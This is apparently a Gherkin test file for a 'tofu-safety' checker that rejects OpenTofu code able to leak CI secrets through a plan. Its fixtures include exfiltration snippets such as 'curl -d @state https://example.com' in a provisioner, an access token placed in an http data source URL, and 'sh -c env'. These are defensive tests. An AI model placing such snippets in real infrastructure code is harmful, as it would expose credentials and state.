@REQ-LZ-012 @security
Feature: Stack code cannot leak data through a plan
  Plans run code from pull requests with CI's credentials and their output is
  public. So OpenTofu code may only use allow-listed providers that can't be
  pointed elsewhere, may keep state only in the gcs backend, and may not run
  commands, print secrets, use remote modules, handle secret payloads or read
  files the stack matrix doesn't know about.

  Scenario: An external data source is rejected with file and line
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      data "external" "x" {
        program = ["sh", "-c", "env"]
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "hashicorp/external"

  Scenario: An http data source is rejected, even inside a check block
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      check "health" {
        data "http" "x" {
          url = "https://example.com/${data.google_client_config.c.access_token}"
        }
        assert {
          condition     = true
          error_message = "never"
        }
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:3" mentions "hashicorp/http"

  Scenario: A provider used only through its resource types is still checked
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      resource "aws_s3_bucket" "x" {
        bucket = "exfil"
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "uses provider hashicorp/aws"

  Scenario: A provider pointed at another endpoint is rejected
    Given a file "stacks/demo/providers.tf" containing:
      """
      # demo
      provider "google" {
        project                 = var.project
        storage_custom_endpoint = "https://example.com/storage/v1/"
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/providers.tf:2" mentions "may not set storage_custom_endpoint"

  Scenario: State can only come from the gcs backend
    Given a file "stacks/demo/main.tf" containing:
      """
      terraform {
        backend "http" {
          address = "https://example.com/state"
        }
      }
      data "terraform_remote_state" "other" {
        backend = "gcs"
        config = {
          bucket                  = "state"
          storage_custom_endpoint = "https://example.com/"
        }
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "state lives in the gcs backend"
    And a finding for "stacks/demo/main.tf:6" mentions "may only set bucket and prefix"

  Scenario: A provisioner is rejected
    Given a file "stacks/demo/main.tf" containing:
      """
      resource "terraform_data" "x" {
        provisioner "local-exec" {
          command = "curl -d @state https://example.com"
        }
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "provisioners run commands"

  Scenario: Printing a sensitive value is rejected
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      output "leak" {
        value = nonsensitive(var.token)
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:3" mentions "nonsensitive()"

  Scenario: A template can't do what the configuration can't
    Given a file "stacks/demo/templates/report.tftpl" containing:
      """
      ${nonsensitive(token)}
      ${file("../../README.md")}
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/templates/report.tftpl:1" mentions "nonsensitive()"
    And a finding for "stacks/demo/templates/report.tftpl:2" mentions "file()"

  Scenario: A declared provider outside the allow-list is rejected
    Given a file "stacks/demo/versions.tf" containing:
      """
      terraform {
        required_providers {
          aws = {
            source = "hashicorp/aws"
          }
        }
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/versions.tf:4" mentions "isn't on the provider allow-list"

  Scenario: A provider pinned in a lock file outside the allow-list is rejected
    Given a file "stacks/demo/.terraform.lock.hcl" containing:
      """
      provider "registry.opentofu.org/hashicorp/aws" {
        version = "6.0.0"
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/.terraform.lock.hcl:1" mentions "isn't on the provider allow-list"

  Scenario: A module from a git URL is rejected
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      module "remote" {
        source = "git::https://example.com/module.git"
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "isn't a local path"

  Scenario: A secret version resource is rejected
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      resource "google_secret_manager_secret_version" "x" {
        secret      = "projects/p/secrets/s"
        secret_data = var.value
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:2" mentions "handles a secret payload"

  Scenario: Reading an undeclared file outside the module is rejected
    Given a file "stacks/demo/main.tf" containing:
      """
      # demo
      locals {
        config = yamldecode(file("${path.module}/../../config/demo.yaml"))
      }
      """
    When I run the "tofu-safety" check
    Then a finding for "stacks/demo/main.tf:3" mentions "declare it in the stack's inputs"

  Scenario: Reading a file the stack declares as an input passes
    Given a file "platforms/stacks.yaml" containing:
      """
      tiers: [canary]
      stacks:
        demo:
          path: stacks/demo
          tier: canary
          envs: [dev]
          inputs: [config/demo.yaml]
      """
    And a file "stacks/demo/main.tf" containing:
      """
      locals {
        config = yamldecode(file("${path.module}/../../config/demo.yaml"))
      }
      """
    When I run the "tofu-safety" check
    Then no findings are reported

  Scenario: Safe stack code passes
    Given a file "stacks/demo/main.tf" containing:
      """
      terraform {
        required_providers {
          google = {
            source  = "hashicorp/google"
            version = "~> 7.0"
          }
        }
        backend "gcs" {
          bucket = var.state_bucket
          prefix = "dev/demo"
        }
      }

      provider "google" {
        project = var.project
        region  = "europe-north1"
      }

      module "labels" {
        source = "../../modules/labels"
      }

      data "terraform_remote_state" "bootstrap" {
        backend = "gcs"
        config = {
          bucket = var.state_bucket
          prefix = "trust-root/bootstrap"
        }
      }

      resource "terraform_data" "marker" {}

      locals {
        policy = templatefile("${path.module}/templates/policy.json.tftpl", {})
        files  = fileset(path.module, "templates/*.tftpl")
      }
      """
    When I run the "tofu-safety" check
    Then no findings are reported

  Scenario: The repository's OpenTofu code is safe
    Given the gcp-agent-factory repository
    When I run the "tofu-safety" check
    Then no findings are reported
